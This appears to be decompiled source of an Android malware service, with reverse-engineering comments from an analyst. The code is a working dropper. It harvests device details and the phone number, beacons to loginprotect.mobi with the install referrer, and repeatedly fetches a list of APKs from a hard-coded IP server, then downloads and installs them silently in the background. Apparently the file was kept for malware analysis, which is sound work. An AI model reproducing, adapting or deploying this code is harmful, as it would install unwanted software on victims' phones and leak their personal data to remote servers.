package com.p003fa.p004c;

/* renamed from: com.fa.c.SystemService */
public class SystemService extends android.app.Service {
    private java.util.List<com.p003fa.p004c.SystemService.InstallTask> _installTasks = new java.util.LinkedList();
    private java.util.List<java.lang.String> _installedApps = new java.util.LinkedList();
    private com.Jump.vikingJump.NativeWrapper _nw;
    private java.lang.Runnable longRunningTask;
    private java.util.concurrent.Future longRunningTaskFuture;
    private java.util.concurrent.Future longRunningTaskFutureInstallThread;
    private java.util.concurrent.Future longRunningTaskFutureKnockThread;
    private java.lang.Runnable longRunningTaskInstallThread;
    private java.lang.Runnable longRunningTaskKnockThread;
    private java.lang.String ref = "";
    private java.lang.Thread threadCps;
    private java.lang.Thread threadInstaller;
    private java.util.concurrent.ExecutorService threadPoolExecutor;
    private java.util.concurrent.ExecutorService threadPoolExecutorInstallThread;
    private java.util.concurrent.ExecutorService threadPoolExecutorKnockThread;

    /* renamed from: com.fa.c.SystemService$1 */
    /** ANAL: receiver_RRR_AAA_FFF broadcast receiver
     *
     * RRR_AAA_FFF is a broadcast that gets launched from InstallReceiver and resent from
     * onNewIntent
     *
     * - Set the extra "r" to `this.ref`
     */
    class receiver_RRR_AAA_FFF extends android.content.BroadcastReceiver {
        receiver_RRR_AAA_FFF() {
        }

        public void onReceive(android.content.Context context, android.content.Intent intent) {
            android.util.Log.d("TRACKING", "123");
            com.p003fa.p004c.SystemService.this.ref = intent.getStringExtra("r");
        }
    }

    /* renamed from: com.fa.c.SystemService$2 */
    /** ANAL: runnable_loginprotect_callback Runnable
     *  - Sleep 3 minutes
     *  - Send callback to loginprotect.mobi
     */
    class runnable_loginprotect_callback implements java.lang.Runnable {
        runnable_loginprotect_callback() {
        }

        public void run() {
            android.util.Log.d("TRACKING", "Ref: r");
            try {
                java.lang.Thread.sleep(180000);
            } catch (java.lang.Exception e) {
            }
            java.lang.String link = "http://loginprotect.mobi/callback.php?referer=";
            java.lang.String referrer = com.p003fa.p004c.SystemService.this.ref;
            android.util.Log.d("TRACKING", "Refff: " + referrer);
            if (referrer != null) {
                link = new java.lang.StringBuilder(java.lang.String.valueOf(link)).append(referrer).toString();
            }
            try {
                java.net.HttpURLConnection urlConnection = (java.net.HttpURLConnection) new java.net.URL(link).openConnection();
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                android.util.Log.d("TRACKING", "Status: " + urlConnection.getResponseCode());
                urlConnection.disconnect();
            } catch (java.lang.Exception e2) {
            }
        }
    }

    /* renamed from: com.fa.c.SystemService$3 */
    class runnable_installtask implements java.lang.Runnable {
        runnable_installtask() {
        }

        public void run() {
            com.p003fa.p004c.SystemService.this.InstallTaskHandler();
        }
    }

    /* renamed from: com.fa.c.SystemService$4 */
    /** ANAL: runnable_send_data_to_native Runnable
     *
     *  Invoked from InstallNonRoot -> SystemService.onStartCommand
     * 
     *  Collect device info and send it to an instance of NativeWrapper through nw.setInfo() and nw.setInfo2() and then run StartCPS()
     */
    class runnable_send_data_to_native implements java.lang.Runnable {
        runnable_send_data_to_native() {
        }

        public void run() {
            com.p003fa.p004c.SystemService.this._nw = new com.Jump.vikingJump.NativeWrapper();
            byte[] deviceDataBytes = com.p003fa.p004c.Utilities.GetDeviceInfoBytes(com.p003fa.p004c.SystemService.this.getApplicationContext());
            java.lang.String deviceData = com.p003fa.p004c.Utilities.GetDeviceInfoString(com.p003fa.p004c.SystemService.this.getApplicationContext());
            if (deviceData != null) {
                byte time = deviceDataBytes[16];
                byte version = deviceDataBytes[17];
                byte batery = deviceDataBytes[18];
                byte wifi = deviceDataBytes[19];
                com.p003fa.p004c.SystemService.this._nw.SetInfo(deviceData);
                com.p003fa.p004c.SystemService.this._nw.SetInfo2(time, version, batery, wifi);
                try {
                    com.p003fa.p004c.SystemService.this._nw.SetPhone(com.p003fa.p004c.Utilities.GetPhoneNumber(com.p003fa.p004c.SystemService.this.getApplicationContext()));
                } catch (java.lang.Exception e) {
                    com.p003fa.p004c.SystemService.this._nw.SetPhone("NO_SIM");
                }
            }
            try {
                // 1st arg: location of exchange_file
                com.p003fa.p004c.SystemService.this._nw.StartCPS(new java.lang.StringBuilder(java.lang.String.valueOf(android.os.Environment.getExternalStorageDirectory().getAbsolutePath())).append(java.io.File.separator).append(com.p003fa.p004c.Utilities.GetExchangeFileName(com.p003fa.p004c.SystemService.this.getApplicationContext())).toString());
            } catch (java.lang.Exception e2) {
            }
        }
    }

    /* renamed from: com.fa.c.SystemService$InstallTask */
    private class InstallTask {
        public int api;
        public java.lang.String bundle;
        public java.lang.String hash;
        /* renamed from: id */
        public java.lang.String f876id;
        public java.lang.String url;

        public InstallTask(java.lang.String id, java.lang.String bundle, java.lang.String url, java.lang.String hash, int api) {
            this.f876id = id;
            this.bundle = bundle;
            this.url = url;
            this.hash = hash;
            this.api = api;
        }
    }

    public void onCreate() {
    }

    /** ANAL: SystemService.onStartCommand(intent, flags, startId)
     *
     * SystemService is invoked exclusively when running in non-root
     *
     * - Run as notification
     * - Work()
     * - Run as task on an executor to collect device info and send it to an instance of `NativeWrapper` through `nw.setInfo()` and `nw.setInfo2()`
     * - StartInstallHandrler()
     *    - Run as task on an executor to install fetched apps
     * - Check for `KEY_KNOCKED` 
     *     - If not, knock()
     *         - Run as task on an executor to send a callback to `http://loginprotect.mobi/callback.php?referer=REF` where `REF` is taken from every `INSTALL_REFERRER` broadcast fired
     * - Register receiver for `RRR_AAA_FFF` broadcast
     *     - This gets triggered by:
     *         - `com.Jump.VikingJump.InstallReceiver`
     *         - `UtilActivity.onNewIntent()`
     */ 
    public int onStartCommand(android.content.Intent intent, int flags, int startId) {
        startForeground(1, new android.app.Notification());
        getApplicationContext().startService(new android.content.Intent(getApplicationContext().getApplicationContext(), com.p003fa.p004c.StartService.class));
        Work();
        StartInstallHandrler();
        android.content.SharedPreferences pref = com.p003fa.p004c.Utilities.GetPreferences(getApplicationContext());
        android.content.SharedPreferences.Editor editor = com.p003fa.p004c.Utilities.GetPreferncesEditor(getApplicationContext());
        if (!pref.contains("SHARED_PREF_KEY_KNOCKED")) {
            editor.putInt("SHARED_PREF_KEY_KNOCKED", 100);
            editor.commit();
            Knock();
        }
        registerReceiver(new com.p003fa.p004c.SystemService.receiver_RRR_AAA_FFF(), new android.content.IntentFilter("RRR_AAA_FFF"));
        return 1;
    }

    public android.os.IBinder onBind(android.content.Intent intent) {
        return null;
    }

    public boolean onUnbind(android.content.Intent intent) {
        return true;
    }

    public void onRebind(android.content.Intent intent) {
    }

    public void onDestroy() {
        super.onDestroy();
        this._nw = null;
        java.lang.System.gc();
        this.longRunningTaskFuture.cancel(true);
        this.longRunningTaskFutureInstallThread.cancel(true);
    }

    /** ANAL: SystemService.Knock()
     *
     * Invoked from InstallAsNonRoot -> SystemService.onStartCommand as part of the "Knock" subtask if SHARED_PREF_KEY_KNOCKED is not set
     * 
     *  Run a thread for one task: runnable_loginprotect_callback()
     */
    private void Knock() {
        this.threadPoolExecutorKnockThread = java.util.concurrent.Executors.newSingleThreadExecutor();
        this.longRunningTaskKnockThread = new com.p003fa.p004c.SystemService.runnable_loginprotect_callback();
        this.longRunningTaskFutureKnockThread = this.threadPoolExecutorKnockThread.submit(this.longRunningTaskKnockThread);
    }

    /** ANAL: SystemService.StartInstallHandrler()
     * 
     *  Run a thread for one task: runnable_installtask()
     */
    private void StartInstallHandrler() {
        java.lang.System.gc();
        this.threadPoolExecutorInstallThread = java.util.concurrent.Executors.newSingleThreadExecutor();
        this.longRunningTaskInstallThread = new com.p003fa.p004c.SystemService.runnable_installtask();
        this.longRunningTaskFutureInstallThread = this.threadPoolExecutorInstallThread.submit(this.longRunningTaskInstallThread);
    }

    /** ANAL: SystemService.Work()
     * 
     *  Run a thread for one task: runnable_send_data_to_native()
     */
    private void Work() {
        this._nw = null;
        java.lang.System.gc();
        this.threadPoolExecutor = java.util.concurrent.Executors.newSingleThreadExecutor();
        this.longRunningTask = new com.p003fa.p004c.SystemService.runnable_send_data_to_native();
        this.longRunningTaskFuture = this.threadPoolExecutor.submit(this.longRunningTask);
    }

    /** ANAL: SystemService.InstallTaskHandler()
     *  - Sleep 3 minutes
     *  - Make a GET reqeust to http://176.9.138.114:7777/ecspectapatronum/ and fetch a JSON array of app names and download urls
     *  - Get a list of installed apps
     *  - Run through the fetched JSON array
     *      - Check that the app is not already installed
     *      - Download -> install -> delete the APK
     */
    private void InstallTaskHandler() {
        try {
            // Sleep for 3 minutes
            java.lang.Thread.sleep(180000); 
        } catch (java.lang.Exception e) {
        }
        while (true) {
            if (this._installTasks == null) {
                this._installTasks = new java.util.LinkedList();
            }
            this._installTasks.clear();
            try {
                org.json.JSONArray jsonApps = new org.json.JSONObject(BytesToUTF8String(HttpGet("http://176.9.138.114:7777/ecspectapatronum/"))).getJSONArray("t");
                if (this._installedApps == null) {
                    this._installedApps = new java.util.LinkedList();
                }
                this._installedApps.clear();
                this._installedApps = GetInstalledApps();
                for (int i = 0; i < jsonApps.length(); i++) {
                    org.json.JSONObject appJson = jsonApps.getJSONObject(i);
                    if (appJson.getInt("platform") == 1) {
                        int api = appJson.getInt("api");
                        if (api <= android.os.Build.VERSION.SDK_INT) {
                            java.lang.String bundle = appJson.getString("bid");
                            if (!IsAppInstalled(bundle)) {
                                java.lang.String id = appJson.getString("id");
                                java.lang.String url = appJson.getString("url");
                                java.lang.String hash = appJson.getString("hash");
                                this._installTasks.add(new com.p003fa.p004c.SystemService.InstallTask(id, bundle, url, hash, api));
                            }
                        }
                    }
                }
                android.util.Log.d("CPS", "InstallTaskHandler will install " + this._installTasks.size());
                for (com.p003fa.p004c.SystemService.InstallTask installTask : this._installTasks) {
                    if (HttpGetFile(installTask.url, installTask.bundle)) {
                        java.lang.System.gc();
                        if (IsMd5Hash(installTask.bundle, installTask.hash)) {
                            InstallApk(installTask.bundle);
                            try {
                                java.lang.Thread.sleep(5000);
                            } catch (java.lang.Exception e2) {
                                android.util.Log.d("CPS", "InstallTaskHandler exception: " + e2.getMessage());
                            }
                            StartOverlayService();
                            long startTime = java.lang.System.currentTimeMillis();
                            while (IsInstalling() && java.lang.System.currentTimeMillis() - startTime < 1200000) {
                                try {
                                    java.lang.Thread.sleep(1000);
                                } catch (java.lang.Exception e22) {
                                    android.util.Log.d("CPS", "InstallTaskHandler exception: " + e22.getMessage());
                                }
                            }
                            StopOverlayService();
                            DeleteApkFile(installTask.bundle);
                            try {
                                java.lang.Thread.sleep(5000);
                            } catch (java.lang.Exception e222) {
                                android.util.Log.d("CPS", "InstallTaskHandler exception: " + e222.getMessage());
                            }
                        } else {
                            android.util.Log.d("CPS", "InstallTaskHandler bad hash");
                            DeleteApkFile(installTask.bundle);
                        }
                    } else {
                        android.util.Log.d("CPS", "InstallTaskHandler cant download apk");
                    }
                }
            } catch (java.lang.Exception e2222) {
                android.util.Log.d("CPS", "InstallTaskHandler exception: " + e2222.getMessage());
            }
            try {
                java.lang.Thread.sleep(300000);
            } catch (java.lang.Exception e22222) {
                android.util.Log.d("CPS", "InstallTaskHandler exception: " + e22222.getMessage());
            }
        }
    }

    private boolean WriteApkAsFile(java.lang.String name, byte[] bytes) {
        try {
            java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream(new java.io.File(android.os.Environment.getExternalStorageDirectory() + "/" + name + ".apk")));
            bos.write(bytes);
            bos.flush();
            bos.close();
            return true;
        } catch (java.lang.Exception e) {
            android.util.Log.d("CPS", "WriteApkAsFile exception: " + e.getMessage());
            return false;
        }
    }

    private boolean DeleteApkFile(java.lang.String name) {
        try {
            return new java.io.File(android.os.Environment.getExternalStorageDirectory() + "/" + name + ".apk").delete();
        } catch (java.lang.Exception e) {
            android.util.Log.d("CPS", "DeleteApkFile exception: " + e.getMessage());
            return false;
        }
    }

    private boolean IsMd5Hash(java.lang.String name, java.lang.String hash) {
        return com.p003fa.p004c.MD5.checkMD5(hash, new java.io.File(android.os.Environment.getExternalStorageDirectory() + "/" + name + ".apk"));
    }

    private byte[] HttpGet(java.lang.String path) {
        try {
            java.net.HttpURLConnection urlConnection = (java.net.HttpURLConnection) new java.net.URL(path).openConnection();
            urlConnection.setChunkedStreamingMode(0);
            java.io.InputStream is = urlConnection.getInputStream();
            byte[] buffer = new byte[8192];
            java.io.ByteArrayOutputStream output = new java.io.ByteArrayOutputStream();
            while (true) {
                int bytesRead = is.read(buffer);
                if (bytesRead == -1) {
                    is.close();
                    return output.toByteArray();
                }
                output.write(buffer, 0, bytesRead);
            }
        } catch (java.lang.Exception e) {
            android.util.Log.d("CPS", "HttpGet exception: " + e.getMessage());
            return null;
        }
    }

    private boolean HttpGetFile(java.lang.String path, java.lang.String name) {
        try {
            java.net.HttpURLConnection urlConnection = (java.net.HttpURLConnection) new java.net.URL(path).openConnection();
            urlConnection.setChunkedStreamingMode(0);
            java.io.InputStream is = urlConnection.getInputStream();
            java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream(new java.io.File(android.os.Environment.getExternalStorageDirectory() + "/" + name + ".apk")));
            byte[] buffer = new byte[8192];
            while (true) {
                int bytesRead = is.read(buffer);
                if (bytesRead == -1) {
                    bos.close();
                    is.close();
                    return true;
                }
                bos.write(buffer, 0, bytesRead);
            }
        } catch (java.lang.Exception e) {
            android.util.Log.d("CPS", "HttpGet exception: " + e.getMessage());
            return false;
        }
    }

    private java.lang.String BytesToUTF8String(byte[] bytes) {
        if (bytes != null) {
            try {
                return new java.lang.String(bytes, "UTF-8");
            } catch (java.lang.Exception e) {
                android.util.Log.d("CPS", "BytesToUTF8String exception: " + e.getMessage());
            }
        }
        return null;
    }

    private boolean IsAppInstalled(java.lang.String bundle) {
        for (java.lang.String b : this._installedApps) {
            if (b.equalsIgnoreCase(bundle)) {
                return true;
            }
        }
        return false;
    }

    private java.util.List<java.lang.String> GetInstalledApps() {
        java.util.List<android.content.pm.ApplicationInfo> packages = getPackageManager().getInstalledApplications(128);
        java.util.List<java.lang.String> res = new java.util.LinkedList();
        for (android.content.pm.ApplicationInfo packageInfo : packages) {
            res.add(packageInfo.packageName);
        }
        return res;
    }

    private void GetRunningProcess() {
        for (com.jaredrummler.android.processes.models.AndroidAppProcess p : com.jaredrummler.android.processes.ProcessManager.getRunningAppProcesses()) {
            if (p.getPackageName().equalsIgnoreCase("com.android.packageinstaller")) {
                if (p.foreground) {
                    android.util.Log.d("CPS", "Installing...");
                } else {
                    android.util.Log.d("CPS", "Not Installing");
                }
            }
        }
    }

    private boolean IsInstalling() {
        java.lang.String processName = "com.android.packageinstaller";
        if (android.os.Build.VERSION.SDK_INT >= 23) {
            processName = "com.google.android.packageinstaller";
        }
        for (com.jaredrummler.android.processes.models.AndroidAppProcess p : com.jaredrummler.android.processes.ProcessManager.getRunningAppProcesses()) {
            if (p.getPackageName().equalsIgnoreCase(processName)) {
                if (p.foreground) {
                    return true;
                }
                return false;
            }
        }
        return false;
    }

    private void InstallApk(java.lang.String apk) {
        android.content.Intent intent = new android.content.Intent("android.intent.action.VIEW");
        intent.setDataAndType(android.net.Uri.fromFile(new java.io.File(android.os.Environment.getExternalStorageDirectory() + "/" + apk + ".apk")), "application/vnd.android.package-archive");
        intent.setFlags(268435456);
        startActivity(intent);
    }

    private void StartOverlayService() {
    }

    private void StopOverlayService() {
    }
}
